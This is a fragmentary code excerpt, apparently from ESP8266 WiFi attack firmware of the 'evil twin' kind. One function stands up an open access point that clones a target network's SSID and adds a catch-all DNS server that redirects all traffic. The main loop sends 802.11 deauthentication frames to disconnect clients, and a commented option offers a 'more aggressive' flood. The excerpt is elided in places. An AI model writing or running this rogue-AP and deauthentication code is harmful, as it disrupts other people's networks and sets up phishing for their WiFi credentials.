...
void handleIndex() {
  ...
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      ...
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(172, 0, 0, 1), IPAddress(172, 0, 0, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str(), NULL, _selectedNetwork.ch); // Set AP channel explicitly
      dnsServer.start(53, "*", IPAddress(172, 0, 0, 1));
...
void loop() {
  ...
  if (deauthing_active && millis() - Tessauth_now >= 1000) {
    ...
    deauthPacket[0] = 0xC0; // Deauthentication frame
    ...
    // Optional: For a more aggressive deauth, uncomment the loop below to send multiple packets per second
    /*
    for (int i = 0; i < 5; i++) {
      deauthPacket[0] = 0xC0;
